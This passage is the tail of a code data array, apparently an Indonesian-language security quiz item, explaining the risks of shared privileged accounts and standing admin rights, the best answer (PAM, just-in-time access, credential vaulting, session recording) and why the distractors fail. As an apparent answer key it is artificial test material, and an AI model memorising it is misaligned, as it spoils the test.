      'Shared privileged account menghilangkan akuntabilitas individual (non-repudiation), sedangkan standing privileges (hak admin 24/7) memperbesar risiko penyalahgunaan internal maupun kompromi akun.',
    solusiTerbaik:
      'PAM + identitas individual + JIT access berbatas waktu + vaulting/rotasi kredensial otomatis + session recording ke SIEM menjamin least privilege dan jejak audit tak terbantahkan.',
    analisisPengecoh:
      'Buku log kertas mudah dimanipulasi/terlewat; standing privileges tanpa MFA/recording melanggar prinsip least privilege dan memperluas blast radius; menyimpan sandi di spreadsheet bersama tetap menghilangkan akuntabilitas dan rawan bocor; menyerahkan kontrol penuh permanen ke vendor melanggar tata kelola keamanan instansi.',
  },
];
